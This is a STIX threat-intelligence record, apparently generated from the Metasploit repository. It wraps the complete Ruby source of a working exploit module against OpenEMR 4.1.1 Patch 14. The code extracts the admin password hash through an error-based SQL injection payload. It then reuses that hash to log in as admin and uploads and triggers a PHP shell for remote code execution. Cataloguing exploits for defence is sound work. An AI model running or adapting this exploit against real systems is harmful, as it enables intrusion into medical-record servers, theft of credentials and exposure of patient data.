{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a8e07225-8b4a-4878-9657-22f7d4bfad1c",
    "created": "2024-08-14T17:12:58.422691Z",
    "modified": "2024-08-14T17:12:58.422696Z",
    "name": "\"OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in OpenEMR version 4.1.1 Patch 14 and lower. When logging in as any non-admin user, it's possible to retrieve the admin SHA1 password hash from the database through SQL injection. The SQL injection vulnerability exists in the \"new_comprehensive_save.php\" page. This hash can be used to log in as the admin user. After logging in, the \"manage_site_files.php\" page will be used to upload arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/openemr_sqli_privesc_upload.rb",
            "external_id": "openemr_sqli_privesc_upload.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in OpenEMR version 4.1.1 Patch 14 and lower.\n        When logging in as any non-admin user, it's possible to retrieve the admin SHA1 password\n        hash from the database through SQL injection. The SQL injection vulnerability exists\n        in the \"new_comprehensive_save.php\" page. This hash can be used to log in as the admin\n        user. After logging in, the \"manage_site_files.php\" page will be used to upload arbitrary\n        code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'xistence <xistence[at]0x90.nl>' # Discovery, Metasploit module\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '97482'],\n          ['EDB', '28329']\n        ],\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          ['OpenEMR', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-09-16',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [true, 'The base path to the OpenEMR installation', '/openemr']),\n          OptString.new('USER', [true, 'The non-admin user', '']),\n          OptString.new('PASS', [true, 'The non-admin password', ''])\n        ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    # Check version\n    print_status(\"Trying to detect installed version\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"interface\", \"login\", \"login.php\")\n    })\n\n    if res and res.code == 200 and res.body =~ /v(\\d+.\\d+.\\d+)/\n      version = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"Version #{version} detected\")\n\n    if version < \"4.1.2\"\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def login(base, name, pass)\n    #print_status(\"Logging in as non-admin user [ #{datastore['USER']} ]\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(\"#{base}\", \"interface\", \"main\", \"main_screen.php\"),\n      'vars_get' => {\n          \"auth\" => \"login\",\n          \"site\" => \"default\"\n      },\n      'vars_post' => {\n        'authProvider' => 'Default',\n        'authUser' => \"#{name}\",\n        'authPass' => \"#{pass}\"\n        }\n    })\n\n    if res && res.code == 200 and res.get_cookies =~ /OpenEMR=([a-zA-Z0-9]+)/\n      session = $1\n      print_good(\"#{rhost}:#{rport} - Login Successful\")\n      print_status(\"#{rhost}:#{rport} - Session cookie is [ #{session} ]\")\n      return session\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Login was not succesful!\")\n    end\n  end\n\n  def exploit\n    # Password should be converted to a SHA1 hash\n    password = Rex::Text.sha1(datastore['PASS'])\n\n    # Login as non-admin\n    cookie = login(uri, datastore['USER'], password)\n\n    sqlq = rand_text_alpha(8)\n    # Generate random string and convert to hex\n    sqls = sqlq.each_byte.map { |b| b.to_s(16) }.join\n\n    # Our SQL Error-Based Injection string - The string will return the admin password hash between the words ABCD<hash>ABCD in the response page.\n    sqli = \"1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x#{sqls},(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,50) \"\n    sqli << \"FROM users WHERE username = 0x61646d696e LIMIT 0,1),0x#{sqls},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '#{sqlq}'='#{sqlq}\"\n\n    post_data = \"form_pubpid=#{sqli}\"\n    print_status(\"Retrieving admin password hash through SQLi\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'data'   => post_data,\n      'cookie' => \"OpenEMR=#{cookie}\",\n      'uri'    => normalize_uri(uri, \"interface\", \"new\", \"new_comprehensive_save.php\")\n    })\n\n    if res and res.code == 200 and res.body =~ /#{sqlq}([a-zA-Z0-9]+)#{sqlq}/\n      adminhash = $1\n      print_status(\"Admin password hash is [ #{adminhash} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Retrieving admin password failed!\")\n    end\n\n    # Login as admin and retrieve cookie\n    cookie = login(uri, \"admin\", \"#{adminhash}\")\n\n    # Random filename\n    payload_name = rand_text_alpha(rand(10) + 5) + '.php'\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"\", nil, nil, \"form-data; name=\\\"bn_save\\\"\")\n    post_data.add_part(payload.encoded, \"application/octet-stream\", nil, \"form-data; name=\\\"form_image\\\"; filename=\\\"#{payload_name}\\\"\")\n    file = post_data.to_s\n    file.strip!\n\n    print_status(\"Uploading shell [ #{payload_name} ]\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"interface\", \"super\", \"manage_site_files.php\"),\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => \"OpenEMR=#{cookie}\",\n      'data'   => file\n    })\n\n    # If the server returns 200 and the body contains our payload name,\n    # we assume we uploaded the malicious file successfully\n    if not res or res.code != 200 or res.body !~ /#{payload_name}/\n      fail_with(Failure::Unknown, \"#{peer} - File wasn't uploaded, aborting!\")\n    end\n\n    register_file_for_cleanup(payload_name)\n\n    print_status(\"Requesting shell [ #{uri}/sites/default/images/#{payload_name} ]\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"sites\", \"default\", \"images\", \"#{payload_name}\")\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.\n    if res and res.code != 200\n      print_error(\"Unexpected response, exploit probably failed!\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-16",
    "x_mitre_platforms": [
        "['php']"
    ]
}